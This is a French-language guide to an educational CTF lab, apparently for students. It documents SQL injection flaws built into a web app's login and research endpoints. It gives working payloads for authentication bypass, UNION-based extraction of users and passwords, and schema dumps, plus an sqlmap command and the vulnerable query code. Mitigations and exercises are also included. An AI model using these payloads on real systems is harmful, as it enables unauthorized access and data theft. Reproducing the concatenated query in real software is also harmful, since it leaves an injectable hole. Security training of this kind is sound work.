# 🚨 Guide des Vulnérabilités - OctoLab CTF

> **⚠️ ATTENTION**: Ce document est destiné uniquement à des fins éducatives dans le cadre d'un exercice de cybersécurité contrôlé.

## 🎯 Objectif de l'exercice

Ce laboratoire contient des vulnérabilités intentionnelles pour permettre aux étudiants d'apprendre les techniques d'exploitation et de sécurisation des applications web.

## 🔓 Vulnérabilité 1: SQL Injection dans l'authentification

### 📍 Localisation
- **Endpoint**: `POST /api/auth/login`
- **Fichier**: `backend/routes/auth.js`
- **Type**: SQL Injection classique

### 🔍 Description de la faille

La route de login utilise une concaténation directe des paramètres dans la requête SQL :

```javascript
const vulnerableQuery = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
```

Cette approche permet d'injecter du code SQL malveillant dans les paramètres `email` ou `password`.

### 🎯 Techniques d'exploitation

#### 1. Bypass d'authentification simple

**Payload dans le champ email** :
```
admin@octolab.org' OR '1'='1' --
```

**Payload dans le champ password** :
```
' OR '1'='1' --
```

#### 2. Bypass avec commentaire SQL

**Email** :
```
' OR 1=1 /*
```

**Password** :
```
N'importe quoi
```

#### 3. Union-based injection (extraction de données)

**Email** :
```
' UNION SELECT id, name, email, password, clearance_level FROM users --
```

#### 4. Extraction de la structure de la base

**Email** :
```
' UNION SELECT name, sql, '', '', '' FROM sqlite_master WHERE type='table' --
```

### 🧪 Tests pratiques

#### Test 1: Bypass simple
1. Aller sur la page de login : http://localhost:5173/login
2. Email : `admin@octolab.org' OR '1'='1' --`
3. Password : `anything`
4. Observer la connexion réussie

#### Test 2: Extraction d'utilisateurs
1. Utiliser Burp Suite ou un outil similaire
2. Intercepter la requête POST vers `/api/auth/login`
3. Modifier le payload pour extraire tous les utilisateurs

#### Test 3: Analyse des logs
1. Observer les logs du serveur backend
2. Voir la requête SQL vulnérable s'afficher avec `🚨 REQUÊTE VULNÉRABLE EXÉCUTÉE:`

### 🛡️ Comparaison avec la version sécurisée

Une route sécurisée est disponible à `/api/auth/login-secure` qui utilise :
- Paramètres liés (prepared statements)
- Hachage bcrypt pour les mots de passe
- Validation appropriée des entrées

## 🔓 Vulnérabilité 2: SQL Injection dans l'API de recherche

### 📍 Localisation
- **Endpoint**: `GET /api/research?id=X`
- **Fichier**: `backend/routes/api.js`
- **Type**: SQL Injection dans les paramètres GET

### 🎯 Techniques d'exploitation

#### 1. Extraction de données
```
http://localhost:3001/api/research?id=1' UNION SELECT id, title, description, classification FROM research_projects --
```

#### 2. Extraction de tous les utilisateurs
```
http://localhost:3001/api/research?id=1' UNION SELECT id, name, email, clearance_level FROM users --
```

## 🛠️ Outils recommandés

### Pour les tests manuels
- **Burp Suite Community** : Interception et modification des requêtes
- **OWASP ZAP** : Scanner de vulnérabilités
- **Postman** : Tests d'API
- **Browser DevTools** : Analyse des requêtes réseau

### Pour les tests automatisés
- **SQLMap** : Outil d'exploitation SQL injection
```bash
sqlmap -u "http://localhost:3001/api/research?id=1" --dbs
```

## 📚 Ressources d'apprentissage

### Documentation OWASP
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

### Laboratoires en ligne
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [DVWA (Damn Vulnerable Web Application)](http://www.dvwa.co.uk/)

## 🔒 Techniques de mitigation

### 1. Paramètres liés (Prepared Statements)
```javascript
// ❌ Vulnérable
const query = `SELECT * FROM users WHERE email = '${email}'`;

// ✅ Sécurisé
db.get('SELECT * FROM users WHERE email = ?', [email], callback);
```

### 2. Validation des entrées
```javascript
// Validation de l'email
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
if (!emailRegex.test(email)) {
  return res.status(400).json({ error: 'Format email invalide' });
}
```

### 3. Échappement des caractères spéciaux
```javascript
const sanitizedInput = input.replace(/['"\\]/g, '\\$&');
```

### 4. Principe du moindre privilège
- Utiliser un compte de base de données avec des permissions limitées
- Éviter les comptes administrateurs pour les applications

## 🏆 Défis pour les étudiants

### Niveau Débutant
1. Réussir à se connecter sans connaître de mot de passe valide
2. Extraire la liste de tous les utilisateurs
3. Découvrir la structure de la base de données

### Niveau Intermédiaire
4. Extraire les mots de passe hachés
5. Identifier les différents niveaux de clearance
6. Exploiter la vulnérabilité dans l'API de recherche

### Niveau Avancé
7. Automatiser l'exploitation avec SQLMap
8. Proposer un correctif sécurisé
9. Implémenter des tests de sécurité automatisés

## 📝 Rapport d'exploitation

Les étudiants doivent documenter :
1. **Découverte** : Comment la vulnérabilité a été identifiée
2. **Exploitation** : Payloads utilisés et résultats obtenus
3. **Impact** : Données sensibles accessibles
4. **Recommandations** : Solutions de sécurisation proposées
5. **Preuve de concept** : Screenshots et logs

---

**⚠️ Rappel important** : Ces vulnérabilités sont intentionnelles et ne doivent être exploitées que dans le cadre de cet exercice éducatif. L'utilisation de ces techniques sur des systèmes non autorisés est illégale.